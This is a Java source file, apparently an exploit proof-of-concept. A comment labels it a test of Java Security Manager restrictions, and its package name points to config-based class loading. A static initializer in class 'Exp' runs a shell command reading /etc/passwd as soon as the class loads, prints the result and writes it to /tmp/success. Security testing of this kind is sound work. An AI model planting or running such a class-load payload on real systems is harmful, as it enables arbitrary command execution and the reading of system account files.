/*
测试1：触发Java Security Manager的限制
*/
package zk_backup_0.configs.conf1;

import java.io.*;

public class Exp {
    static {
        try {
            String command = "head -n 5 /etc/passwd";
            ProcessBuilder builder = new ProcessBuilder(command.split("\\s+"));
            Process process = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            String res = "";
            while (line != null) {
                res = res + line + "\n";
                line = reader.readLine();
            }
            reader.close();
            System.out.println(res);
            new File("/tmp/success").createNewFile();
            FileOutputStream stream = new FileOutputStream("/tmp/success");
            stream.write(res.getBytes());
//            stream.write(command.getBytes());
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
